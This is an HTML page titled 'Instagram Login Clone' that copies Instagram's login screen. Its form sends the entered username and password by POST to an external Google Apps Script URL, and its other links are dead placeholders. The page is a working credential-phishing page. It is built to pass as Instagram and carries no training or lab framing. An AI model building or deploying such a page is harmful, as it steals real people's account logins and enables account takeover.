<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Clone</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #fff;
      border: 1px solid #dbdbdb;
      width: 350px;
      padding: 40px 40px 20px;
      text-align: center;
    }

    .container img {
      width: 175px;
      margin-bottom: 30px;
    }

    .input-box {
      width: 100%;
      margin-bottom: 10px;
    }

    .input-box input {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }

    .btn-login {
      width: 100%;
      padding: 10px;
      background: #0095f6;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 3px;
      margin-top: 10px;
      cursor: pointer;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 15px 0;
    }

    .divider div {
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .divider span {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: bold;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      display: block;
      margin: 15px 0;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }

    .signup-box {
      margin-top: 20px;
      border: 1px solid #dbdbdb;
      background: #fff;
      padding: 20px;
      font-size: 14px;
    }

    .signup-box a {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }

    .app-links {
      margin-top: 20px;
      text-align: center;
    }

    .app-links img {
      height: 40px;
      margin: 5px;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <!-- Instagram logo (optional) -->
      <!-- <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo"> -->

      <!-- 🔹 Direct form submission to Google Apps Script -->
      <form action="https://script.google.com/macros/s/AKfycbwtyCEVJcZ1IWXPxK2y0CvgGx1lNtcFKKpqNkIWMH_IfhVOdi3acSjmltF8QMwPTzp6sQ/exec" method="POST">
        <div class="input-box">
          <input type="text" name="username" placeholder="Phone number, username, or email" required>
        </div>

        <div class="input-box">
          <input type="password" name="password" placeholder="Password" required>
        </div>

        <button type="submit" class="btn-login">Log In</button>
      </form>

      <div class="divider">
        <div></div>
        <span>OR</span>
        <div></div>
      </div>

      <a href="#" class="fb-login">Log in with Facebook</a>
      <a href="#" class="forgot">Forgot password?</a>
    </div>

    <div class="signup-box">
      Don’t have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-links">
      <p>Get the app.</p>
      <img src="https://www.pngmart.com/files/10/Download-On-The-App-Store-PNG-Transparent.png" alt="App Store">
      <img src="https://www.pngmart.com/files/10/Get-It-On-Google-Play-PNG-Transparent.png" alt="Google Play">
    </div>
  </div>
</body>
</html>
